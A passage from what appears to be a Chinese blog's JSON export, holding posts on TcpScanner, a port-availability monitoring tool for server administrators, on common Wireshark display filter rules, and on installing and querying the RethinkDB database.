title=\"优点\"></a>优点</h4><ul>\n<li>图形化界面，管理方便使用简单</li>\n<li>支持批量服务器端口检测</li>\n<li>自定义扫描间隔，自定义结果筛选条件</li>\n</ul>\n<h4 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h4><ul>\n<li>目前只支持tcp扫描</li>\n<li>没有优化，可能存在一些bug</li>\n</ul>\n<h3 id=\"TcpScanner用法\"><a href=\"#TcpScanner用法\" class=\"headerlink\" title=\"TcpScanner用法\"></a>TcpScanner用法</h3><h4 id=\"（1）填写excel\"><a href=\"#（1）填写excel\" class=\"headerlink\" title=\"（1）填写excel\"></a>（1）填写excel</h4><p>先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。<br><img src=\"/upload_image/20161014/excel.png\" alt=\"\"><br>严格按照模板填写，否则可能会使结果不准确，<em>NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。</em></p>\n<h4 id=\"（2）加载excel\"><a href=\"#（2）加载excel\" class=\"headerlink\" title=\"（2）加载excel\"></a>（2）加载excel</h4><p>运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。</p>\n<h4 id=\"（3）检测excel\"><a href=\"#（3）检测excel\" class=\"headerlink\" title=\"（3）检测excel\"></a>（3）检测excel</h4><p>点击检测，程序将对excel填写内容进行检测，如无问题则显示<em>导入excel成功</em>，如有问题则检查excel填写是否有误。</p>\n<h4 id=\"（4）选择参数\"><a href=\"#（4）选择参数\" class=\"headerlink\" title=\"（4）选择参数\"></a>（4）选择参数</h4><p>选择运行间隔、中断筛选参数。<br>注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。</p>\n<h4 id=\"（5）开始运行\"><a href=\"#（5）开始运行\" class=\"headerlink\" title=\"（5）开始运行\"></a>（5）开始运行</h4><p>　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。</p>\n<p>　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。</p>\n<p>注：<em>在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。</em></p>\n<h3 id=\"TcpScanner下载\"><a href=\"#TcpScanner下载\" class=\"headerlink\" title=\"TcpScanner下载\"></a>TcpScanner下载</h3><p>（GITHUB源代码下载）：<a href=\"https://github.com/tengzhangchao/TcpScanner\" target=\"_blank\" rel=\"external\">TcPScannerV1.2</a><br>（百度网盘下载）：<a href=\"http://pan.baidu.com/s/1hsjYQlI\" target=\"_blank\" rel=\"external\">TcPScannerV1.2</a><br>（如果需要1.3版本，可以在博客下方留言）</p>\n<p>结语：<em>工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！</em></p>\n","excerpt":"","more":"<p>　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。</p>\n<h3 id=\"TcpScanner介绍\"><a href=\"#TcpScanner介绍\" class=\"headerlink\" title=\"TcpScanner介绍\"></a>TcpScanner介绍</h3><p>在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。<br>先来一张截图：<br><img src=\"/upload_image/20161014/jietu.png\" alt=\"\"><br>背景金刚狼！</p>\n<h4 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ul>\n<li>检测服务器端口存活性</li>\n<li>支持nslookup</li>\n<li>邮件告警（1.3版本中已加入）</li>\n</ul>\n<h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h4><ul>\n<li>图形化界面，管理方便使用简单</li>\n<li>支持批量服务器端口检测</li>\n<li>自定义扫描间隔，自定义结果筛选条件</li>\n</ul>\n<h4 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h4><ul>\n<li>目前只支持tcp扫描</li>\n<li>没有优化，可能存在一些bug</li>\n</ul>\n<h3 id=\"TcpScanner用法\"><a href=\"#TcpScanner用法\" class=\"headerlink\" title=\"TcpScanner用法\"></a>TcpScanner用法</h3><h4 id=\"（1）填写excel\"><a href=\"#（1）填写excel\" class=\"headerlink\" title=\"（1）填写excel\"></a>（1）填写excel</h4><p>先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。<br><img src=\"/upload_image/20161014/excel.png\" alt=\"\"><br>严格按照模板填写，否则可能会使结果不准确，<em>NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。</em></p>\n<h4 id=\"（2）加载excel\"><a href=\"#（2）加载excel\" class=\"headerlink\" title=\"（2）加载excel\"></a>（2）加载excel</h4><p>运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。</p>\n<h4 id=\"（3）检测excel\"><a href=\"#（3）检测excel\" class=\"headerlink\" title=\"（3）检测excel\"></a>（3）检测excel</h4><p>点击检测，程序将对excel填写内容进行检测，如无问题则显示<em>导入excel成功</em>，如有问题则检查excel填写是否有误。</p>\n<h4 id=\"（4）选择参数\"><a href=\"#（4）选择参数\" class=\"headerlink\" title=\"（4）选择参数\"></a>（4）选择参数</h4><p>选择运行间隔、中断筛选参数。<br>注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。</p>\n<h4 id=\"（5）开始运行\"><a href=\"#（5）开始运行\" class=\"headerlink\" title=\"（5）开始运行\"></a>（5）开始运行</h4><p>　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。</p>\n<p>　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。</p>\n<p>注：<em>在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。</em></p>\n<h3 id=\"TcpScanner下载\"><a href=\"#TcpScanner下载\" class=\"headerlink\" title=\"TcpScanner下载\"></a>TcpScanner下载</h3><p>（GITHUB源代码下载）：<a href=\"https://github.com/tengzhangchao/TcpScanner\">TcPScannerV1.2</a><br>（百度网盘下载）：<a href=\"http://pan.baidu.com/s/1hsjYQlI\">TcPScannerV1.2</a><br>（如果需要1.3版本，可以在博客下方留言）</p>\n<p>结语：<em>工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！</em></p>\n"},{"title":"WireShark过滤规则","date":"2017-02-09T03:02:14.000Z","comments":1,"_content":"　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。\n\n### IP过滤\nip源地址：　　ip.src　　　　ip.src==10.0.3.109\nip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114\n\n### 端口过滤\ntcp.port==80　　　　所有端口为80的包\ntcp.dstport==80　　　目的端口为80的包\ntcp.srcport==80　　　源端口为80的包\n\n### 协议过滤\nhttp\ntcp\nicmp\n.......\n\n### http模式过滤\nhttp.request.method==\"GET\"　　查找GET包\nhttp.request.method==\"POST\"　　查找POST包\n\n### 连接符\nand　　&\nor　　||\n\n### 自助模式\n可以打开wireshark的Expression会弹出Filter Expression窗口：\n![](/upload_image/20170209/1.png)\n","source":"_posts/WireShark过滤规则.md","raw":"---\ntitle: WireShark过滤规则\ndate: 2017-02-09 11:02:14\ncomments: true\ntags: wireshark\ncategories: 安全工具\n---\n　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。\n\n### IP过滤\nip源地址：　　ip.src　　　　ip.src==10.0.3.109\nip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114\n\n### 端口过滤\ntcp.port==80　　　　所有端口为80的包\ntcp.dstport==80　　　目的端口为80的包\ntcp.srcport==80　　　源端口为80的包\n\n### 协议过滤\nhttp\ntcp\nicmp\n.......\n\n### http模式过滤\nhttp.request.method==\"GET\"　　查找GET包\nhttp.request.method==\"POST\"　　查找POST包\n\n### 连接符\nand　　&\nor　　||\n\n### 自助模式\n可以打开wireshark的Expression会弹出Filter Expression窗口：\n![](/upload_image/20170209/1.png)\n","slug":"WireShark过滤规则","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dybb000v3ofvwsnhd3s3","content":"<p>　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。</p>\n<h3 id=\"IP过滤\"><a href=\"#IP过滤\" class=\"headerlink\" title=\"IP过滤\"></a>IP过滤</h3><p>ip源地址：　　ip.src　　　　ip.src==10.0.3.109<br>ip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114</p>\n<h3 id=\"端口过滤\"><a href=\"#端口过滤\" class=\"headerlink\" title=\"端口过滤\"></a>端口过滤</h3><p>tcp.port==80　　　　所有端口为80的包<br>tcp.dstport==80　　　目的端口为80的包<br>tcp.srcport==80　　　源端口为80的包</p>\n<h3 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h3><p>http<br>tcp<br>icmp<br>…….</p>\n<h3 id=\"http模式过滤\"><a href=\"#http模式过滤\" class=\"headerlink\" title=\"http模式过滤\"></a>http模式过滤</h3><p>http.request.method==”GET”　　查找GET包<br>http.request.method==”POST”　　查找POST包</p>\n<h3 id=\"连接符\"><a href=\"#连接符\" class=\"headerlink\" title=\"连接符\"></a>连接符</h3><p>and　　&amp;<br>or　　||</p>\n<h3 id=\"自助模式\"><a href=\"#自助模式\" class=\"headerlink\" title=\"自助模式\"></a>自助模式</h3><p>可以打开wireshark的Expression会弹出Filter Expression窗口：<br><img src=\"/upload_image/20170209/1.png\" alt=\"\"></p>\n","excerpt":"","more":"<p>　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。</p>\n<h3 id=\"IP过滤\"><a href=\"#IP过滤\" class=\"headerlink\" title=\"IP过滤\"></a>IP过滤</h3><p>ip源地址：　　ip.src　　　　ip.src==10.0.3.109<br>ip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114</p>\n<h3 id=\"端口过滤\"><a href=\"#端口过滤\" class=\"headerlink\" title=\"端口过滤\"></a>端口过滤</h3><p>tcp.port==80　　　　所有端口为80的包<br>tcp.dstport==80　　　目的端口为80的包<br>tcp.srcport==80　　　源端口为80的包</p>\n<h3 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h3><p>http<br>tcp<br>icmp<br>…….</p>\n<h3 id=\"http模式过滤\"><a href=\"#http模式过滤\" class=\"headerlink\" title=\"http模式过滤\"></a>http模式过滤</h3><p>http.request.method==”GET”　　查找GET包<br>http.request.method==”POST”　　查找POST包</p>\n<h3 id=\"连接符\"><a href=\"#连接符\" class=\"headerlink\" title=\"连接符\"></a>连接符</h3><p>and　　&amp;<br>or　　||</p>\n<h3 id=\"自助模式\"><a href=\"#自助模式\" class=\"headerlink\" title=\"自助模式\"></a>自助模式</h3><p>可以打开wireshark的Expression会弹出Filter Expression窗口：<br><img src=\"/upload_image/20170209/1.png\" alt=\"\"></p>\n"},{"title":"Rethinkdb搭建与使用","date":"2017-02-07T07:31:06.000Z","comments":1,"_content":"　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）......既然如此，就来介绍一下Nosql界的黑科技--rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。\n　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。\n详细介绍请参考：[https://rethinkdb.com/faq/](https://rethinkdb.com/faq/)\n\nrethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。\n\n### Server端安装使用\n\nserver安装支持平台：linux，windows，mac\n\n#### ubuntu安装\n直接使用apt-get安装：\n```bash\nsource /etc/lsb-release && echo \"deb http://download.rethinkdb.com/apt $DISTRIB_CODENAME main\" | sudo tee /etc/apt/sources.list.d/rethinkdb.list\nwget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -\nsudo apt-get update\nsudo apt-get install rethinkdb\n```\n运行rethinkdb服务：\n```bash\n$ rethinkdb\ninfo: Creating directory /home/user/rethinkdb_data\ninfo: Listening for intracluster connections on port 29015\ninfo: Listening for client driver connections on port 28015\ninfo: Listening for administrative HTTP connections on port 8080\ninfo: Server ready\n```\n其他安装方式请参考：[https://rethinkdb.com/docs/install/ubuntu/](https://rethinkdb.com/docs/install/ubuntu/)\n\n#### windows安装\n下载安装包：\nhttps://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip\n运行rethinkdb程序：\n```bash\nC:\\Users\\Slava\\>cd RethinkDB\nC:\\Users\\Slava\\RethinkDB\\>\nC:\\Users\\Slava\\RethinkDB\\>rethinkdb.exe\n```\n注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。\nweb管理页面：\n![](/upload_image/20170207/1.png)\n\n### Client端安装使用\n\nClient端支持编程语言：javascript，ruby，python，java，这里以python举例。\n\n#### python\n##### Install\n```bash\nsudo pip install rethinkdb\n```\n##### Usage\n```bash\nimport rethinkdb as r\nclass dbOperation():\n    def __init__(self,dbname,tablename):\n        self.conn = r.connect(host=\"localhost\",port=29015)\n        self.table = r.db(dbname).table(tablename)\n\n    def Insert(self,document):\n        '''\n        插入记录到数据库\n        '''\n        return self.table.insert(document, conflict=\"update\").run(self.conn)\n\n    def query(self,**kwargs):\n        '''\n        自定义查询\n        '''\n        f=self.table.run(self.conn)  ##选择网站名称为空的记录。\n        content=[]\n        for i in f:\n            content.append(i)\n        return content\n```\n详情请参考：[https://rethinkdb.com/docs/cookbook/python/](https://rethinkdb.com/docs/cookbook/python/)\n\n### Data Explorer工具\n这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。\n![](/upload_image/20170207/2.png)\n\n#### 常用语句\n```bash\nr.db(\"\").table(\"\").count()\nr.db(\"\").table(\"\").filter({\"\":\"\"})\nr.table('movies').filter({rank: 1})\nr.table('movies').without('id').distinct().count()   删除重复项\nr.table('moviesUnique').orderBy('rank').limit(10)  显示前十大电影\nr.table('moviesUnique').orderBy(r.desc('rank')).limit(10)\n```\n详情请参考：[https://rethinkdb.com/docs/reql-data-exploration/](https://rethinkdb.com/docs/reql-data-exploration/)\n","source":"_posts/rethinkdb搭建与使用.md","raw":"---\ntitle: Rethinkdb搭建与使用\ndate: 2017-02-07 15:31:06\ncomments: true\ntags: rethinkdb\ncategories: 技术交流\n---\n　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）......既然如此，就来介绍一下Nosql界的黑科技--rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。\n　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。\n详细介绍请参考：[https://rethinkdb.com/faq/](https://rethinkdb.com/faq/)\n\nrethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。\n\n### Server端安装使用\n\nserver安装支持平台：linux，windows，mac\n\n#### ubuntu安装\n直接使用apt-get安装：\n```bash\nsource /etc/lsb-release && echo \"deb http://download.rethinkdb.com/apt $DISTRIB_CODENAME main\" | sudo tee /etc/apt/sources.list.d/rethinkdb.list\nwget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -\nsudo apt-get update\nsudo apt-get install rethinkdb\n```\n运行rethinkdb服务：\n```bash\n$ rethinkdb\ninfo: Creating directory /home/user/rethinkdb_data\ninfo: Listening for intracluster connections on port 29015\ninfo: Listening for client driver connections on port 28015\ninfo: Listening for administrative HTTP connections on port 8080\ninfo: Server ready\n```\n其他安装方式请参考：[https://rethinkdb.com/docs/install/ubuntu/](https://rethinkdb.com/docs/install/ubuntu/)\n\n#### windows安装\n下载安装包：\nhttps://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip\n运行rethinkdb程序：\n```bash\nC:\\Users\\Slava\\>cd RethinkDB\nC:\\Users\\Slava\\RethinkDB\\>\nC:\\Users\\Slava\\RethinkDB\\>rethinkdb.exe\n```\n注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。\nweb管理页面：\n![](/upload_image/20170207/1.png)\n\n### Client端安装使用\n\nClient端支持编程语言：javascript，ruby，python，java，这里以python举例。\n\n#### python\n##### Install\n```bash\nsudo pip install rethinkdb\n```\n##### Usage\n```bash\nimport rethinkdb as r\nclass dbOperation():\n    def __init__(self,dbname,tablename):\n        self.conn = r.connect(host=\"localhost\",port=29015)\n        self.table = r.db(dbname).table(tablename)\n\n    def Insert(self,document):\n        '''\n        插入记录到数据库\n        '''\n        return self.table.insert(document, conflict=\"update\").run(self.conn)\n\n    def query(self,**kwargs):\n        '''\n        自定义查询\n        '''\n        f=self.table.run(self.conn)  ##选择网站名称为空的记录。\n        content=[]\n        for i in f:\n            content.append(i)\n        return content\n```\n详情请参考：[https://rethinkdb.com/docs/cookbook/python/](https://rethinkdb.com/docs/cookbook/python/)\n\n### Data Explorer工具\n这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。\n![](/upload_image/20170207/2.png)\n\n#### 常用语句\n```bash\nr.db(\"\").table(\"\").count()\nr.db(\"\").table(\"\").filter({\"\":\"\"})\nr.table('movies').filter({rank: 1})\nr.table('movies').without('id').distinct().count()   删除重复项\nr.table('moviesUnique').orderBy('rank').limit(10)  显示前十大电影\nr.table('moviesUnique').orderBy(r.desc('rank')).limit(10)\n```\n详情请参考：[https://rethinkdb.com/docs/reql-data-exploration/](https://rethinkdb.com/docs/reql-data-exploration/)\n","slug":"rethinkdb搭建与使用","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dybf000y3ofvmvicv0s1","content":"<p>　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）……既然如此，就来介绍一下Nosql界的黑科技–rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。<br>　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。<br>详细介绍请参考：<a href=\"https://rethinkdb.com/faq/\" target=\"_blank\" rel=\"external\">https://rethinkdb.com/faq/</a></p>\n<p>rethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。</p>\n<h3 id=\"Server端安装使用\"><a href=\"#Server端安装使用\" class=\"headerlink\" title=\"Server端安装使用\"></a>Server端安装使用</h3><p>server安装支持平台：linux，windows，mac</p>\n<h4 id=\"ubuntu安装\"><a href=\"#ubuntu安装\" class=\"headerlink\" title=\"ubuntu安装\"></a>ubuntu安装</h4><p>直接使用apt-get安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">source</span> /etc/lsb-release &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://download.rethinkdb.com/apt <span class=\"variable\">$DISTRIB_CODENAME</span> main\"</span> | sudo tee /etc/apt/sources.list.d/rethinkdb.list</div><div class=\"line\">wget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install rethinkdb</div></pre></td></tr></table></figure></p>\n<p>运行rethinkdb服务：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ rethinkdb</div><div class=\"line\">info: Creating directory /home/user/rethinkdb_data</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> intracluster connections on port 29015</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> client driver connections on port 28015</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> administrative HTTP connections on port 8080</div><div class=\"line\">info: Server ready</div></pre></td></tr></table></figure></p>\n<p>其他安装方式请参考：<a href=\"https://rethinkdb.com/docs/install/ubuntu/\" target=\"_blank\" rel=\"external\">https://rethinkdb.com/docs/install/ubuntu/</a></p>\n<h4 id=\"windows安装\"><a href=\"#windows安装\" class=\"headerlink\" title=\"windows安装\"></a>windows安装</h4><p>下载安装包：<br><a href=\"https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip\" target=\"_blank\" rel=\"external\">https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip</a><br>运行rethinkdb程序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">C:\\Users\\Slava\\&gt;<span class=\"built_in\">cd</span> RethinkDB</div><div class=\"line\">C:\\Users\\Slava\\RethinkDB\\&gt;</div><div class=\"line\">C:\\Users\\Slava\\RethinkDB\\&gt;rethinkdb.exe</div></pre></td></tr></table></figure></p>\n<p>注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。<br>web管理页面：<br><img src=\"/upload_image/20170207/1.png\" alt=\"\"></p>\n<h3 id=\"Client端安装使用\"><a href=\"#Client端安装使用\" class=\"headerlink\" title=\"Client端安装使用\"></a>Client端安装使用</h3><p>Client端支持编程语言：javascript，ruby，python，java，这里以python举例。</p>\n<h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><h5 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo pip install rethinkdb</div></pre></td></tr></table></figure>\n<h5 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">import rethinkdb as r</div><div class=\"line\">class dbOperation():</div><div class=\"line\">    def __init__(self,dbname,tablename):</div><div class=\"line\">        self.conn = r.connect(host=<span class=\"string\">\"localhost\"</span>,port=29015)</div><div class=\"line\">        self.table = r.db(dbname).table(tablename)</div><div class=\"line\"></div><div class=\"line\">    def Insert(self,document):</div><div class=\"line\">        <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">        插入记录到数据库</div><div class=\"line\">        '<span class=\"string\">''</span></div><div class=\"line\">        <span class=\"built_in\">return</span> self.table.insert(document, conflict=<span class=\"string\">\"update\"</span>).run(self.conn)</div><div class=\"line\"></div><div class=\"line\">    def query(self,**kwargs):</div><div class=\"line\">        <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">        自定义查询</div><div class=\"line\">        '<span class=\"string\">''</span></div><div class=\"line\">        f=self.table.run(self.conn)  <span class=\"comment\">##选择网站名称为空的记录。</span></div><div class=\"line\">        content=[]</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f:</div><div class=\"line\">            content.append(i)</div><div class=\"line\">        <span class=\"built_in\">return</span> content</div></pre></td></tr></table></figure>\n<p>详情请参考：<a href=\"https://rethinkdb.com/docs/cookbook/python/\" target=\"_blank\" rel=\"external\">https://rethinkdb.com/docs/cookbook/python/</a></p>\n<h3 id=\"Data-Explorer工具\"><a href=\"#Data-Explorer工具\" class=\"headerlink\" title=\"Data Explorer工具\"></a>Data Explorer工具</h3><p>这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。<br><img src=\"/upload_image/20170207/2.png\" alt=\"\"></p>\n<h4 id=\"常用语句\"><a href=\"#常用语句\" class=\"headerlink\" title=\"常用语句\"></a>常用语句</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">r.db(<span class=\"string\">\"\"</span>).table(<span class=\"string\">\"\"</span>).count()</div><div class=\"line\">r.db(<span class=\"string\">\"\"</span>).table(<span class=\"string\">\"\"</span>).filter(&#123;<span class=\"string\">\"\"</span>:<span class=\"string\">\"\"</span>&#125;)</div><div class=\"line\">r.table(<span class=\"string\">'movies'</span>).filter(&#123;rank: 1&#125;)</div><div class=\"line\">r.table(<span class=\"string\">'movies'</span>).without(<span class=\"string\">'id'</span>).distinct().count()   删除重复项</div><div class=\"line\">r.table(<span class=\"string\">'moviesUnique'</span>).orderBy(<span class=\"string\">'rank'</span>).limit(10)  显示前十大电影</div><div class=\"line\">r.table(<span class=\"string\">'moviesUnique'</span>).orderBy(r.desc(<span class=\"string\">'rank'</span>)).limit(10)</div></pre></td></tr></table></figure>\n<p>详情请参考：<a href=\"https://rethinkdb.com/docs/reql-data-exploration/\" target=\"_blank\" rel=\"external\">https://rethinkdb.com/docs/reql-data-exploration/</a></p>\n","excerpt":"","more":"<p>　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）……既然如此，就来介绍一下Nosql界的黑科技–rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。<br>　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。<br>详细介绍请参考：<a href=\"https://rethinkdb.com/faq/\">https://rethinkdb.com/faq/</a></p>\n<p>rethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。</p>\n<h3 id=\"Server端安装使用\"><a href=\"#Server端安装使用\" class=\"headerlink\" title=\"Server端安装使用\"></a>Server端安装使用</h3><p>server安装支持平台：linux，windows，mac</p>\n<h4 id=\"ubuntu安装\"><a href=\"#ubuntu安装\" class=\"headerlink\" title=\"ubuntu安装\"></a>ubuntu安装</h4><p>直接使用apt-get安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">source</span> /etc/lsb-release &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://download.rethinkdb.com/apt <span class=\"variable\">$DISTRIB_CODENAME</span> main\"</span> | sudo tee /etc/apt/sources.list.d/rethinkdb.list</div><div class=\"line\">wget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -</div><div class=\"line\">sudo apt-get update</div><div 